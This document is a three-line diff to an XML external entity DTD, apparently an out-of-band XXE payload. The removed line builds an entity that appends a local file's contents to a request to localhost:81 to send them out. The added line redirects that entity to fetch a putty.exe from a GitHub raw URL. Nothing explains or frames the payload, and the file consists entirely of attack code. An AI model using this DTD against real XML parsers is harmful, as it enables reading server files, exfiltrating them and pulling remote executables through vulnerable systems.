@@ -1,3 +1,3 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:81?%file;'>">
+<!ENTITY % all "<!ENTITY send SYSTEM 'https://github.com/MASMob2022/dhmas/raw/main/putty.exe'>">
 %all;
